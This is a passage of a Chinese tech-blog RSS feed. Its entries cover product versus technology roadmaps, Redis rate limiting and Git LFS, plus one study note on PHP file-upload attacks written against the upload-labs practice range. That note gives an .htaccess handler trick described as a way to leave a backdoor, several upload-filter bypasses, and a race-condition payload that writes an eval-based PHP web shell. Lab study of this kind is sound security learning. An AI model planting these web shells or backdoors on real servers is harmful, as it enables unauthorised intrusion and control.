      <description>首页编程日记开发工具嵌入式服务器运维[产品管理-48]：产品生命周期 - 产品线路图、技术线路图以及各自的区别news/2025/10/31 17:53:39/目录一、产品线路图1、产品路线图的内容2、产品路线图的绘制步骤3、产品路线图的作用与目的4、产品路线图的应用场景二、技术线路图1、定义与特征2、种类与分类3、作用与意义4、绘制方法5、案例分享三、产品线路图与技术线路图区别1、定义与关注点2、目的与应用3、制定步骤与要素一、产品线路图产品线路图，通常称为产品路线图（Product Roadmap），是一个战略性的规划工具，用于指导产品从概念到市场的全过程。它不仅展示了产品的发展方向和关键里程碑，还包含了时间线、资源分配、市场策略等多个维度。以下是对产品路线图的详细解析：1、产品路线图的内容一份完整的产品路线图应详细描述产品从概念想法阶段到进入市场的全过程，具体包含以下方面：长期目标：明确产品的最终愿景，包括产品希望达到的市场地位、用户影响以及对公司的贡献。市场定位：定义产品在市场中的位置，包括目标用户群体、竞争对手分析以及差异化策略。战略目标：设定与公司整体战略相一致的具体目标，如市场份额、用户增长或收入目标。功能列表：详细列出产品将包含的所有功能，包括核心功能和附加功能。功能优先级：根据用户需求、市场反馈和战略目标，对功能进行优先级排序。功能迭代：规划功能的开发顺序，确保关键功能优先开发，同时考虑功能的相互依赖性。开发周期：为每个功能或迭代设定开始和结束日期，确保时间安排合理且可行。关键日期：标记产品的关键日期，如概念验证、用户测试、产品发布等。缓冲时间：预留时间缓冲，以应对不可预见的延误和变更。其他：还包括概念验证、原型开发、测试阶段、发布计划、人力资源、财务资源、技术资源、风险识别与评估、应对策略、关键性能指标（KPIs）、进度跟踪、效果评估、用户参与、持续改进、销售渠道、用户支持、产品维护等方面的内容。2、产品路线图的绘制步骤绘制产品路线图的步骤通常包括：收集信息：从市场分析、用户需求、技术评估和业务目标中收集必要的信息。确定愿景：与团队和利益相关者讨论，明确产品的愿景和战略。功能优先级排序：根据业务目标和资源限制，对功能进行排序。绘制时间线：为每个功能或阶段设定时间节点，创建初步的时间线。资源规划：分配必要的资源，包括团队成员、预算和技术。风险识别与评估：评估潜在风险，并制定缓解策略。沟通和审查：与团队分享路线图，收集反馈并进行调整。持续更新：产品路线图应随着项目进展和市场变化而更新。3、产品路线图的作用与目的产品路线图的主要作用和目的包括：明确方向：为团队提供一个清晰的方向，确保所有成员都朝着相同的目标努力。资源优化：通过优先级排序，合理分配资源，确保关键功能得到足够的关注。风险管理：提前识别潜在风险，制定应对策略，减少不确定性。沟通桥梁：作为沟通工具，帮助团队成员、利益相关者和投资者理解产品的发展计划。持续迭代：支持敏捷开发，允许团队根据市场反馈和内部变化进行调整。4、产品路线图的应用场景产品路线图广泛应用于各个行业和领域，特别是在产品开发、项目管理、战略规划等方面。它可以帮助企业更好地规划产品的发展路径，确保产品能够按时、按质、按量地推向市场，满足用户的需求和期望。综上所述，产品路线图是一个重要的战略性规划工具，它涵盖了产品从概念到市场的全过程，为团队提供了明确的方向和指引。通过绘制和更新产品路线图，企业可以更好地管理资源、识别风险、优化产品功能，并最终实现产品的成功上市和持续发展。二、技术线路图技术路线图（Technology Roadmap）是一个描述技术变化的步骤或技术相关环节之间的逻辑关系的图表或文字说明。以下是对技术路线图的详细解析：1、定义与特征定义：技术路线图通过简洁的图形、表格、文字等形式，展示了技术发展的路径、目标、资源及市场之间的关系，以及实现目标所需的关键技术。特征：高度概括：技术路线图以简洁明了的方式展示了技术发展的整体框架和关键步骤。高度综合：它综合了技术、市场、资源等多个方面的信息，形成了一个完整的规划体系。前瞻性：技术路线图不仅描述了现状，还预测了未来的技术发展趋势。2、种类与分类技术路线图的种类很多，根据不同的分类标准，可以将其分为以下几类：按执行层次或规模分类：公司层的技术路线图：针对特定公司的技术发展路径进行规划。行业层的技术路线图：针对整个行业的发展趋势和技术路径进行规划。计划层的技术路线图：针对特定的技术计划或项目进行规划。项目层面的技术路线图：针对具体的研发项目或技术改进项目进行规划。按绘制过程分类：市场驱动的技术路线图：以市场需求为导向，根据市场需求的变化来规划技术发展路径。技术驱动的技术路线图：以技术发展为导向，根据技术的最新进展和趋势来规划技术发展路径。科学驱动的技术路线图：以科学研究为基础，根据科学研究的最新成果和发现来规划技术发展路径。3、作用与意义明确发展方向：技术路线图能够帮助使用者明确该领域的发展方向和实现目标所需的关键技术。理清关系：它有助于理清产品和技术之间的关系，以及技术之间的逻辑关系。提供决策依据：技术路线图可以为技术开发战略研讨和政策优先顺序研讨提供知识、信息基础和对话框架，从而提高决策效率。促进交流：技术路线图可以作为技术交流和沟通的工具，帮助不同利益相关者就技术发展路径达成共识。4、绘制方法绘制技术路线图的方法因软件工具和个人习惯而异，但一般包括以下步骤：确定目标：明确技术路线图的目标和范围，包括研究领域、技术目标、时间范围等。收集信息：收集相关技术、市场、资源等方面的信息，为绘制技术路线图提供基础数据。选择工具：选择合适的绘图工具，如Microsoft Visio、Word、PPT等。对于复杂的路线图，推荐使用Visio等专业的绘图软件。绘制草图：根据收集的信息和目标，绘制技术路线图的草图，包括主要的技术节点、时间节点和逻辑关系等。完善细节：在草图的基础上，完善技术路线图的细节，包括添加文字说明、调整图形布局等。审核与修改：邀请相关专家或利益相关者对技术路线图进行审核，并根据反馈进行修改和完善。5、案例分享在博士论文《基于政府规制的绿色供应链动态决策研究》中，作者绘制了一个清晰的技术路线图。该路线图将绪论与理论基础并列，并在这基础上依次研究了政府规制中的短期动态博弈和长期动态博弈。最左列展示每一章节的博弈主体，主体部分具体展示每一章节的研究内容，最右列展示每一章节的研究方法。这种技术路线图清晰地展示了论文的研究逻辑和主要内容，为读者提供了直观的理解框架。综上所述，技术路线图是一个重要的规划工具，它能够帮助使用者明确发展方向、理清关系、提供决策依据并促进交流。在绘制技术路线图时，需要明确目标、收集信息、选择合适的工具并按照一定的步骤进行绘制。三、产品线路图与技术线路图区别产品线路图（通常称为产品路线图）与技术线路图在产品开发过程中各自扮演着重要角色，它们在定义、关注点、目的以及应用领域等方面存在明显的区别。1、定义与关注点产品路线图定义：产品路线图是一个战略性的规划工具，它展示了产品的发展方向、关键里程碑以及预期的发布时间。它通常用于将短期和长期业务目标与特定产品创新的解决方案进行匹配，以实现这些目标。关注点：产品路线图更侧重于产品的整体规划和市场定位，包括产品的功能、特性、上市时间、销售目标等。它关注的是产品从概念到市场的全过程，以及如何实现业务目标。技术路线图定义：技术路线图是以时间为节点的技术发展或技术计划的示意图，用于指导新技术开发或新产品的技术选择。它描述了技术变化的步骤或技术相关环节之间的逻辑关系。关注点：技术路线图则更侧重于技术层面的规划和实施，展示技术的演变和发展趋势。它主要关注技术的发展趋势、技术的成熟度、可行性和成本等因素，以及这些技术如何支持产品的开发和实施。2、目的与应用产品路线图目的：产品路线图的主要目的是向内部团队和外部利益相关者传达项目的方向和进展，描述实现目标所需的高级别措施和设计步骤。它有助于确保所有成员对产品的未来有共同的愿景和目标，并促进团队之间的协作和沟通。应用：产品路线图广泛应用于多个行业和领域，但更侧重于产品的整体规划和上市过程的管理。它可以帮助企业更好地管理资源、识别风险、优化产品功能，并最终实现产品的成功上市和持续发展。技术路线图目的：技术路线图的主要目的是帮助组织更好地规划和管理技术的研发和实施，以实现业务目标。它提供了技术开发战略研讨和政策优先顺序研讨的知识、信息基础和对话框架，有助于企业制定更加科学和有效的技术战略和计划。应用：技术路线图同样适用于多个行业和领域，如汽车、软件、硬件、机械等。它可以帮助企业更好地把握技术发展趋势，优化技术研发流程，降低技术风险，并提高技术创新的效率和成功率。3、制定步骤与要素虽然产品路线图和技术路线图的制定步骤和要素有所不同，但两者都需要经过信息收集、目标确定、规划制定和沟通审查等阶段。在制定过程中，两者都需要考虑市场需求、技术可行性、资源分配等因素。然而，由于两者的关注点不同，因此在制定步骤和要素上也有所差异。产品路线图：在制定产品路线图时，企业需要明确产品的长期目标和市场定位，分析市场需求和竞争态势，制定产品的功能特性和开发计划，并确定产品的上市时间和销售目标。这些要素通常以图形或列表的形式展示出来，形成产品路线图。技术路线图：在制定技术路线图时，企业需要明确组织的业务目标和战略，确定与这些目标相关的关键技术领域。然后，对这些技术领域进行深入研究和分析，了解技术的发展趋势和市场需求。接着，制定相应的技术计划，考虑技术的成熟度、可行性和成本等因素。最后，确定关键的技术节点和时间点，将技术计划以图形方式展示出来，形成技术路线图。综上所述，产品路线图与技术路线图在定义、关注点、目的与应用以及制定步骤与要素等方面都存在明显的区别。两者在产品开发过程中相互补充，共同推动产品的成功开发和上市。http://www.ppmy.cn/news/1540402.html相关文章tPS+redis限流算法拓展: 
压力测试概念及方法(TPS/并发量)_压测tps-CSDN博客 
压测指标TPS和QPS_压测tps-CSDN博客 
------------------------------------------------------------------------------ 
基于Redis限流&amp;#xff08;固定窗口、滑动窗口、漏桶、令牌桶&amp;#xff09;&amp;#xff08;肝货…阅读更多...DAY47WEB 攻防-PHP 应用文件上传函数缺陷条件竞争二次渲染黑白名单JS 绕过1、PHP-原生态-文件上传-检测后缀&amp;黑白名单2、PHP-原生态-文件上传-检测信息&amp;类型内容3、PHP-原生态-文件上传-函数缺陷&amp;逻辑缺陷4、PHP-原生态-文件上传-版本缺陷&amp;配置缺陷 文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题…阅读更多...使用 Git LFS（大文件存储）Git LFS&amp;#xff08;Large File Storage&amp;#xff09;是一种扩展 Git 的工具&amp;#xff0c;旨在更有效地管理大文件的版本控制。它通过将大文件的内容存储在 Git 之外来解决 Git 在处理大文件时的性能问题。 
主要特点 
替代存储&amp;#xff1a;Git LFS 不直接将大文件存储在 Git 仓库…阅读更多...基于STM32的电动汽车遥控器设计引言 
本项目设计了一个基于STM32的电动汽车遥控器&amp;#xff0c;能够通过无线通信&amp;#xff08;如蓝牙或射频模块&amp;#xff09;控制电动汽车的前进、后退、左右转向等动作。该遥控器采用按键或摇杆操作&amp;#xff0c;并通过无线模块将控制指令发送给汽车控制端&amp;#xff0c;实现远程操…阅读更多...数据结构练习题4(链表)1两两交换链表中的节点 
给你一个链表&amp;#xff0c;两两交换其中相邻的节点&amp;#xff0c;并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题&amp;#xff08;即&amp;#xff0c;只能进行节点交换&amp;#xff09;。 示例 1&amp;#xff1a; 输入&amp;#xff1a;head  [1,2,3,4]…阅读更多...上海市计算机学会竞赛平台2024年10月月赛丙组游戏闯关题目描述 
小爱现在想要通关一个游戏&amp;#xff0c;已知这个游戏主角的生命值没有上限&amp;#xff0c;但当游戏过程中任意时刻一旦生命值小于等于零、则游戏会结束。 
已知该游戏共有 nn 的关卡&amp;#xff0c;第 ii 个关卡有一个参数 aiai​&amp;#xff0c;当 ai&gt;0ai​&gt;0 时表示小爱…阅读更多...Spring Boot技术栈在电影评论网站中的应用2相关技术 
2.1 MYSQL数据库 MySQL是一个真正的多用户、多线程SQL数据库服务器。 是基于SQL的客户/服务器模式的关系数据库管理系统&amp;#xff0c;它的有点有有功能强大、使用简单、管理方便、安全可靠性高、运行速度快、多线程、跨平台性、完全网络化、稳定性等&amp;#xff0c;非常…阅读更多...使用短效IP池的优势是什么？短效IP池作为代理IP服务中一种独特的资源管理方式&amp;#xff0c;其应用已经在数据采集、市场分析和网络安全等多个领域中展示出强大的功能。尽管“短效”听起来似乎意味着某种限制&amp;#xff0c;然而在某些特定的应用场景下&amp;#xff0c;短效IP池却提供了无可比拟的优势。本文将详细…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:39 +0000</pubDate>
    </item>
    <item>
      <title>tPS+redis限流算法</title>
      <link>https://www.ppmy.cn/news/1540401.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维tPS+redis限流算法news/2025/10/31 17:53:38/拓展:压力测试概念及方法(TPS/并发量)_压测tps-CSDN博客压测指标TPS和QPS_压测tps-CSDN博客------------------------------------------------------------------------------基于Redis限流（固定窗口、滑动窗口、漏桶、令牌桶）（肝货！！！）_滑动窗口限流 python redis-CSDN博客限流方案——基于Redis实现限流_redis限流-CSDN博客这个写的很好 :限流常在网关这一层做，比如Nginx、Openresty、kong、zuul、Spring Cloud Gateway等，而像spring cloud - gateway网关限流底层实现原理，就是基于Redis + Lua，通过内置Lua限流脚本的方式http://www.ppmy.cn/news/1540401.html相关文章DAY47WEB 攻防-PHP 应用文件上传函数缺陷条件竞争二次渲染黑白名单JS 绕过1、PHP-原生态-文件上传-检测后缀&amp;黑白名单2、PHP-原生态-文件上传-检测信息&amp;类型内容3、PHP-原生态-文件上传-函数缺陷&amp;逻辑缺陷4、PHP-原生态-文件上传-版本缺陷&amp;配置缺陷 文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题…阅读更多...使用 Git LFS（大文件存储）Git LFS&amp;#xff08;Large File Storage&amp;#xff09;是一种扩展 Git 的工具&amp;#xff0c;旨在更有效地管理大文件的版本控制。它通过将大文件的内容存储在 Git 之外来解决 Git 在处理大文件时的性能问题。 
主要特点 
替代存储&amp;#xff1a;Git LFS 不直接将大文件存储在 Git 仓库…阅读更多...基于STM32的电动汽车遥控器设计引言 
本项目设计了一个基于STM32的电动汽车遥控器&amp;#xff0c;能够通过无线通信&amp;#xff08;如蓝牙或射频模块&amp;#xff09;控制电动汽车的前进、后退、左右转向等动作。该遥控器采用按键或摇杆操作&amp;#xff0c;并通过无线模块将控制指令发送给汽车控制端&amp;#xff0c;实现远程操…阅读更多...数据结构练习题4(链表)1两两交换链表中的节点 
给你一个链表&amp;#xff0c;两两交换其中相邻的节点&amp;#xff0c;并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题&amp;#xff08;即&amp;#xff0c;只能进行节点交换&amp;#xff09;。 示例 1&amp;#xff1a; 输入&amp;#xff1a;head  [1,2,3,4]…阅读更多...上海市计算机学会竞赛平台2024年10月月赛丙组游戏闯关题目描述 
小爱现在想要通关一个游戏&amp;#xff0c;已知这个游戏主角的生命值没有上限&amp;#xff0c;但当游戏过程中任意时刻一旦生命值小于等于零、则游戏会结束。 
已知该游戏共有 nn 的关卡&amp;#xff0c;第 ii 个关卡有一个参数 aiai​&amp;#xff0c;当 ai&gt;0ai​&gt;0 时表示小爱…阅读更多...Spring Boot技术栈在电影评论网站中的应用2相关技术 
2.1 MYSQL数据库 MySQL是一个真正的多用户、多线程SQL数据库服务器。 是基于SQL的客户/服务器模式的关系数据库管理系统&amp;#xff0c;它的有点有有功能强大、使用简单、管理方便、安全可靠性高、运行速度快、多线程、跨平台性、完全网络化、稳定性等&amp;#xff0c;非常…阅读更多...使用短效IP池的优势是什么？短效IP池作为代理IP服务中一种独特的资源管理方式&amp;#xff0c;其应用已经在数据采集、市场分析和网络安全等多个领域中展示出强大的功能。尽管“短效”听起来似乎意味着某种限制&amp;#xff0c;然而在某些特定的应用场景下&amp;#xff0c;短效IP池却提供了无可比拟的优势。本文将详细…阅读更多...C++ 模板（基础）前言&amp;#xff1a; 
C 中的模板是一个强大的功能&amp;#xff0c;允许程序员编写通用的代码&amp;#xff0c;这些代码可以处理任何数据类型。模板使得代码更加灵活和可重用&amp;#xff0c;而不必为每种数据类型编写重复的代码。下面详细解释 C 中的模板 
内容摘要&amp;#xff1a; 
本文内容包含…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:38 +0000</pubDate>
    </item>
    <item>
      <title>DAY47WEB 攻防-PHP 应用文件上传函数缺陷条件竞争二次渲染黑白名单JS 绕过</title>
      <link>https://www.ppmy.cn/news/1540400.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维DAY47WEB 攻防-PHP 应用文件上传函数缺陷条件竞争二次渲染黑白名单JS 绕过news/2025/10/31 17:53:37/1、PHP-原生态-文件上传-检测后缀&amp;黑白名单2、PHP-原生态-文件上传-检测信息&amp;类型内容3、PHP-原生态-文件上传-函数缺陷&amp;逻辑缺陷4、PHP-原生态-文件上传-版本缺陷&amp;配置缺陷文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中出现安全问题，也会在语言版本，语言函数，中间件，引用的第三方编辑器等存在缺陷地方配合利用。另外文件上传也有多个存储逻辑，不同的文件存储方案也会给攻击者带来不一样的挑战！测试环境安装参考：本地使用phpstudy安装upload-labs靶场https://github.com/fuzzdb-project/fuzzdb1、前端JS如何判断是否是前端验证呢？首先抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了如何绕过？先上传一个图片后缀抓包改成脚本后缀2、.htaccess(apache独有的配置文件)一般上传用的不多，主要用来留后门apache中，.htaccess文件可以上传并执行这个文件定义了哪个文件可以以脚本方式运行方式一：在.htaccess中写入:&lt;FilesMatch "s.jpg"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;然后再上传s.jpg的木马, 这样s.jpg就可解析为php文件最好拿到shell之后修改自带的这个文件，添加上面的那段代码，就可以留个后门了方式二：AddType application/x-httpd-php .png3、MIME类型Content-Type：image/png || image/jpeg4、文件头判断GIF89a5、黑名单-过滤不严无递归(只检测一次，没循环)pphphp(因为代码中是把匹配到的黑名单替换为空)6、黑名单-过滤不严(windows中大小写没问题，但是在linux上是不能大小写的，要么全小写，要么全大写)系统大小写敏感属性7、低版本GET-%00截断自动解码一次/var/www/html/upload/x.php%008、低版本POST-%00截断9、黑名单-过滤不严10、逻辑不严-条件竞争2.请求不断发包3.访问创建脚本代码&lt;?php fputs(fopen('xiao.php','w'),'&lt;?php eval($_REQUEST[1]);?&gt;');?&gt;11、二次渲染(后端语言会对图片进行二次渲染，让图片更好的呈现出来，但是这样就会造成一个图片里插入的脚本代码丢失的情况)1.先搞个正常图片，上传图片后导出渲染后的图片3.最后利用提示的文件包含执行图片后门代码12、函数缺陷1.使用move_uploaded_file 函数2.保存的文件名可控http://www.ppmy.cn/news/1540400.html相关文章使用 Git LFS（大文件存储）Git LFS&amp;#xff08;Large File Storage&amp;#xff09;是一种扩展 Git 的工具&amp;#xff0c;旨在更有效地管理大文件的版本控制。它通过将大文件的内容存储在 Git 之外来解决 Git 在处理大文件时的性能问题。 
主要特点 
替代存储&amp;#xff1a;Git LFS 不直接将大文件存储在 Git 仓库…阅读更多...基于STM32的电动汽车遥控器设计引言 
本项目设计了一个基于STM32的电动汽车遥控器&amp;#xff0c;能够通过无线通信&amp;#xff08;如蓝牙或射频模块&amp;#xff09;控制电动汽车的前进、后退、左右转向等动作。该遥控器采用按键或摇杆操作&amp;#xff0c;并通过无线模块将控制指令发送给汽车控制端&amp;#xff0c;实现远程操…阅读更多...数据结构练习题4(链表)1两两交换链表中的节点 
给你一个链表&amp;#xff0c;两两交换其中相邻的节点&amp;#xff0c;并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题&amp;#xff08;即&amp;#xff0c;只能进行节点交换&amp;#xff09;。 示例 1&amp;#xff1a; 输入&amp;#xff1a;head  [1,2,3,4]…阅读更多...上海市计算机学会竞赛平台2024年10月月赛丙组游戏闯关题目描述 
小爱现在想要通关一个游戏&amp;#xff0c;已知这个游戏主角的生命值没有上限&amp;#xff0c;但当游戏过程中任意时刻一旦生命值小于等于零、则游戏会结束。 
已知该游戏共有 nn 的关卡&amp;#xff0c;第 ii 个关卡有一个参数 aiai​&amp;#xff0c;当 ai&gt;0ai​&gt;0 时表示小爱…阅读更多...Spring Boot技术栈在电影评论网站中的应用2相关技术 
2.1 MYSQL数据库 MySQL是一个真正的多用户、多线程SQL数据库服务器。 是基于SQL的客户/服务器模式的关系数据库管理系统&amp;#xff0c;它的有点有有功能强大、使用简单、管理方便、安全可靠性高、运行速度快、多线程、跨平台性、完全网络化、稳定性等&amp;#xff0c;非常…阅读更多...使用短效IP池的优势是什么？短效IP池作为代理IP服务中一种独特的资源管理方式&amp;#xff0c;其应用已经在数据采集、市场分析和网络安全等多个领域中展示出强大的功能。尽管“短效”听起来似乎意味着某种限制&amp;#xff0c;然而在某些特定的应用场景下&amp;#xff0c;短效IP池却提供了无可比拟的优势。本文将详细…阅读更多...C++ 模板（基础）前言&amp;#xff1a; 
C 中的模板是一个强大的功能&amp;#xff0c;允许程序员编写通用的代码&amp;#xff0c;这些代码可以处理任何数据类型。模板使得代码更加灵活和可重用&amp;#xff0c;而不必为每种数据类型编写重复的代码。下面详细解释 C 中的模板 
内容摘要&amp;#xff1a; 
本文内容包含…阅读更多...8-基于双TMS320C6678 + XC7K420T的6U CPCI Express高速数据处理平台1、板卡概述 板卡由我公司自主研发&amp;#xff0c;基于6UCPCI架构&amp;#xff0c;处理板包含双片TI DSP TMS320C6678芯片&amp;#xff1b;一片Xilinx公司FPGA XC7K420T-1FFG1156 芯片&amp;#xff1b;六个千兆网口&amp;#xff08;FPGA两个&amp;#xff0c;DSP四个&amp;#xff09;&amp;#xff1b;DSP与FPGA之…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:37 +0000</pubDate>
    </item>
    <item>
      <title>使用 Git LFS（大文件存储）</title>
      <link>https://www.ppmy.cn/news/1540399.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维使用 Git LFS（大文件存储）news/2025/10/31 17:53:36/Git LFS（Large File Storage）是一种扩展 Git 的工具，旨在更有效地管理大文件的版本控制。它通过将大文件的内容存储在 Git 之外来解决 Git 在处理大文件时的性能问题。主要特点替代存储：Git LFS 不直接将大文件存储在 Git 仓库中，而是将这些文件的指针（小文件）存储在 Git 中。实际的文件内容存储在远程 LFS 服务器上。提高性能：由于大文件不再被直接存储在 Git 仓库中，克隆和拉取操作的速度显著提高，特别是对于包含多个大文件的项目。版本控制：Git LFS 仍然允许对大文件进行版本控制，您可以像对待普通文件一样对这些大文件进行添加、提交和推送操作。安装 Git LFS：根据操作系统安装 Git LFS：Git LFS 安装指南初始化 Git LFS：git lfs install跟踪大文件类型：git lfs track "*.exe"添加更改：git add .gitattributes
git add MQTTBox-win.exe提交更改：git commit -m "Add MQTTBox-win.exe using Git LFS"推送到远程仓库：git push origin &lt;your-branch&gt;替换 &lt;your-branch&gt; 为实际的分支名称，例如 main 或 develop。注意事项确保在未来的提交中，所有文件都保持在项目的大小限制之内。如果有项目的管理权限，可以考虑修改 Git Hooks 设置来提高文件大小限制。http://www.ppmy.cn/news/1540399.html相关文章基于STM32的电动汽车遥控器设计引言 
本项目设计了一个基于STM32的电动汽车遥控器&amp;#xff0c;能够通过无线通信&amp;#xff08;如蓝牙或射频模块&amp;#xff09;控制电动汽车的前进、后退、左右转向等动作。该遥控器采用按键或摇杆操作&amp;#xff0c;并通过无线模块将控制指令发送给汽车控制端&amp;#xff0c;实现远程操…阅读更多...数据结构练习题4(链表)1两两交换链表中的节点 
给你一个链表&amp;#xff0c;两两交换其中相邻的节点&amp;#xff0c;并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题&amp;#xff08;即&amp;#xff0c;只能进行节点交换&amp;#xff09;。 示例 1&amp;#xff1a; 输入&amp;#xff1a;head  [1,2,3,4]…阅读更多...上海市计算机学会竞赛平台2024年10月月赛丙组游戏闯关题目描述 
小爱现在想要通关一个游戏&amp;#xff0c;已知这个游戏主角的生命值没有上限&amp;#xff0c;但当游戏过程中任意时刻一旦生命值小于等于零、则游戏会结束。 
已知该游戏共有 nn 的关卡&amp;#xff0c;第 ii 个关卡有一个参数 aiai​&amp;#xff0c;当 ai&gt;0ai​&gt;0 时表示小爱…阅读更多...Spring Boot技术栈在电影评论网站中的应用2相关技术 
2.1 MYSQL数据库 MySQL是一个真正的多用户、多线程SQL数据库服务器。 是基于SQL的客户/服务器模式的关系数据库管理系统&amp;#xff0c;它的有点有有功能强大、使用简单、管理方便、安全可靠性高、运行速度快、多线程、跨平台性、完全网络化、稳定性等&amp;#xff0c;非常…阅读更多...使用短效IP池的优势是什么？短效IP池作为代理IP服务中一种独特的资源管理方式&amp;#xff0c;其应用已经在数据采集、市场分析和网络安全等多个领域中展示出强大的功能。尽管“短效”听起来似乎意味着某种限制&amp;#xff0c;然而在某些特定的应用场景下&amp;#xff0c;短效IP池却提供了无可比拟的优势。本文将详细…阅读更多...C++ 模板（基础）前言&amp;#xff1a; 
C 中的模板是一个强大的功能&amp;#xff0c;允许程序员编写通用的代码&amp;#xff0c;这些代码可以处理任何数据类型。模板使得代码更加灵活和可重用&amp;#xff0c;而不必为每种数据类型编写重复的代码。下面详细解释 C 中的模板 
内容摘要&amp;#xff1a; 
本文内容包含…阅读更多...8-基于双TMS320C6678 + XC7K420T的6U CPCI Express高速数据处理平台1、板卡概述 板卡由我公司自主研发&amp;#xff0c;基于6UCPCI架构&amp;#xff0c;处理板包含双片TI DSP TMS320C6678芯片&amp;#xff1b;一片Xilinx公司FPGA XC7K420T-1FFG1156 芯片&amp;#xff1b;六个千兆网口&amp;#xff08;FPGA两个&amp;#xff0c;DSP四个&amp;#xff09;&amp;#xff1b;DSP与FPGA之…阅读更多...VS Code开发qt项目没整明白&amp;#xff0c;尴尬  安装扩展  设置cmake路径 前提是已经安装了QT 报错  用msvc选windows启动&amp;#xff0c;用mingw则选gdb启动阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:36 +0000</pubDate>
    </item>
    <item>
      <title>基于STM32的电动汽车遥控器设计</title>
      <link>https://www.ppmy.cn/news/1540398.html</link>
